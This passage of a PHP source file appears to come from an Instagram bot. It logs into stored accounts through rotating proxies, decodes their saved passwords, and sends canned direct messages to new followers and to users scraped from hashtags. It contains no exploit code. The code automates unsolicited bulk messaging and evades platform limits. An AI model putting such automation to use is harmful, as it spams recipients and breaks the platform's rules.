        //                                 $log = array('text' => 'Message sent', 'username' => $peopleers, 'target' => $target, 'ppic' => $peopleerspic);

        //                                 DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'automessage', 'log' => json_encode($log)]);
        //                             }
        //                         } else {
        //                             if ($data->captiongroup == !NULL) {
        //                                 $group = DB::table('ab_groups')->where('user_id', $data->user_id)->where('groupname', $data->captiongroup)->where('type', 'caption')->inRandomOrder()->first();
        //                                 $captions = DB::table('ab_captions')->where('group_id', $group->id)->inRandomOrder()->first();

        //                                 $getuser = $ig->people->getUserIdForName($peopleings);

        //                                 $a = array( "users" => array ($getuser));

        //                                 $ig->direct->sendText($a, $captions->caption);

        //                                 $log = array('text' => 'Message sent', 'username' => $peopleings, 'target' => $target, 'ppic' => $peopleingspic);

        //                                 DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'automessage', 'log' => json_encode($log)]);
        //                             }
        //                         }
        //                     } elseif ($data->tofollowers == 1) {
        //                         if ($data->captiongroup == !NULL) {
        //                             $group = DB::table('ab_groups')->where('user_id', $data->user_id)->where('groupname', $data->captiongroup)->where('type', 'caption')->inRandomOrder()->first();
        //                             $captions = DB::table('ab_captions')->where('group_id', $group->id)->inRandomOrder()->first();

        //                             $getuser = $ig->people->getUserIdForName($peopleers);

        //                             $a = array( "users" => array ($getuser));

        //                             $ig->direct->sendText($a, $captions->caption);

        //                             $log = array('text' => 'Message sent', 'username' => $peopleers, 'target' => $target, 'ppic' => $peopleerspic);

        //                             DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'automessage', 'log' => json_encode($log)]);
        //                         }
        //                     } elseif ($data->tofollowings == 1) {
        //                         if ($data->captiongroup == !NULL) {
        //                             $group = DB::table('ab_groups')->where('user_id', $data->user_id)->where('groupname', $data->captiongroup)->where('type', 'caption')->inRandomOrder()->first();
        //                             $captions = DB::table('ab_captions')->where('group_id', $group->id)->inRandomOrder()->first();

        //                             $getuser = $ig->people->getUserIdForName($peopleings);

        //                             $a = array( "users" => array ($getuser));

        //                             $ig->direct->sendText($a, $captions->caption);

        //                             $log = array('text' => 'Message sent', 'username' => $peopleings, 'target' => $target, 'ppic' => $peopleingspic);

        //                             DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'automessage', 'log' => json_encode($log)]);
        //                         }
        //                     }
        //                 }

        //                 if ($target[0] == "#") {
        //                     $st = 1;
        //                     $replace = str_replace("#", "", $target);
                            
        //                     $hashtagfol = array(
        //                         $ig->hashtag->getFeed($replace, $rankToken)
        //                     );
                            
        //                     foreach ($hashtagfol as $key => $value) {
        //                         $value     = json_decode(json_encode($value), true);
        //                         $rand      = rand(0, count($value['items']) - 1);
        //                         $hashtagfol = $value['items'][$rand]['user']['username'];
        //                         $hashtagfolpic = $value['items'][$rand]['user']['profile_pic_url'];
        //                         $hashtagfolanonpic = $value['items'][$rand]['user']['has_anonymous_profile_picture'];
        //                         $hashtagfolpriv = $value['items'][$rand]['user']['is_private'];
        //                     }

        //                     if ($data->accountphoto == "true") {
        //                         if ($hashtagfolanonpic == 1) {
        //                             $st = 0;
        //                         }
        //                     }elseif ($data->accountphoto == "false") {
        //                         if ($hashtagfolanonpic != 1) {
        //                             $st = 0;
        //                         }
        //                     }

        //                     if ($data->accountstatus == "true") {
        //                         if ($hashtagfolpriv == 1) {
        //                             $st = 0;
        //                         }
        //                     }elseif ($data->accountstatus == "false") {
        //                         if ($hashtagfolpriv != 1) {
        //                             $st = 0;
        //                         }
        //                     }

        //                     if ($data->botdetect != NULL || $data->botdetect != 0) {
        //                         $people  = $ig->people->getUserIdForName($hashtagfol);
        //                         $count1 = array($ig->people->getInfoById($people));
        //                         foreach ($count1 as $key => $value) {
        //                             $value     = json_decode(json_encode($value), true);
        //                             $folcount1 = $value['user']['follower_count'];
        //                         }
        //                         if ($folcount1 < $data->botdetect) {
        //                             $st = 0;
        //                         }
        //                     }

        //                     if ($data->botdetect2 != NULL || $data->botdetect2 != 0) {
        //                         $people2  = $ig->people->getUserIdForName($hashtagfol);
        //                         $count2 = array($ig->people->getInfoById($people2));
        //                         foreach ($count2 as $key => $value) {
        //                             $value     = json_decode(json_encode($value), true);
        //                             $medcount1 = $value['user']['media_count'];
        //                         }
        //                         if ($medcount1 < $data->botdetect2) {
        //                             $st = 0;
        //                         }
        //                     }

                            
        //                     if ($st == 1) {
        //                         if ($data->captiongroup == !NULL) {
        //                             $group = DB::table('ab_groups')->where('user_id', $data->user_id)->where('groupname', $data->captiongroup)->where('type', 'caption')->inRandomOrder()->first();
        //                             $captions = DB::table('ab_captions')->where('group_id', $group->id)->inRandomOrder()->first();

        //                             $gethashuser = $ig->people->getUserIdForName($hashtagfol);

        //                             $a = array( "users" => array ($gethashuser));

        //                             $ig->direct->sendText($a, $captions->caption);

        //                             $log = array('text' => 'Message sent', 'username' => $hashtagfol, 'target' => $target, 'ppic' => $hashtagfolpic);

        //                             DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'automessage', 'log' => json_encode($log)]);
        //                         }
        //                     }
        //                 }
        //             }
        //             catch (\Exception $e) {
        //                 // DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'error', 'log' => $e->getMessage()]);
        //                 continue;
        //             }
                    
        //             DB::table('ab_automessage_data')->where('username', $data->username)->increment('position');
        //         }
        //     }
        // }

        $dmdata = DB::table('ab_autodmtonew_data')->get();

        foreach ($dmdata as $data) {
            
            if ($data->status == 1) {
                try {
                    if ($proxycheck->{'sysproxies'} == 1) {
                        $proxies = DB::table('ab_proxies')->inRandomOrder()->first();

                        if (!empty($proxies)) {
                            $ig->setProxy($proxies->proxy);
                        }
                    }
                    
                    $account  = DB::table('ab_accounts')->where('username', $data->username)->first();
                    $pass     = noah($account->password);
                    $password = ulus($pass);
                    
                    $ig->login($data->username, $password);
                }
                catch (\Exception $e) {
                    DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'error', 'log' => $e->getMessage()]);
                    continue;
                }
                
                try {
                    $getactivity = array(
                        $ig->people->getRecentActivityInbox()
                    );

                    foreach ($getactivity as $key => $value) {
                        $value     = json_decode(json_encode($value), true);
                        $gettype = $value['new_stories']['0']['type'];
                        $getstorytype = $value['new_stories']['0']['story_type'];
                        if ($gettype == 3 && $getstorytype == 101) {
                            $getid = $value['new_stories']['0']['args']['inline_follow']['user_info']['id'];
                            $getusername = $value['new_stories']['0']['args']['inline_follow']['user_info']['username'];
                            $getpic = $value['new_stories']['0']['args']['inline_follow']['user_info']['profile_pic_url'];
                        }
                    }

                    if ($getusername != $data->last) {
                        if ($gettype == 3 && $getstorytype == 101) {
                            if ($data->caption == !NULL) {
                                $group = DB::table('ab_groups')->where('user_id', $data->user_id)->where('groupname', $data->caption)->where('type', 'caption')->inRandomOrder()->first();
                                $captions = DB::table('ab_captions')->where('group_id', $group->id)->inRandomOrder()->first();

                                $a = array( "users" => array ($getid));

                                $ig->direct->sendText($a, $captions->caption);

                                DB::table('ab_autodmtonew_data')->where('user_id', $data->user_id)->where('username', $data->username)->update(['last' => $getusername]);

                                $log = array('text' => 'DM sent to new follower', 'username' => $getusername, 'ppic' => $getpic);

                                DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'autodmtonew', 'log' => json_encode($log)]);
                            }
                        }
                    }
                }
                catch (\Exception $e) {
                    // DB::table('ab_logs')->insert(['account_id' => $data->account_id, 'username' => $data->username, 'type' => 'error', 'log' => $e->getMessage()]);
                    continue;
                }
                
                DB::table('ab_autodmtonew_data')->where('username', $data->username)->increment('position');
            }
        }
    }
}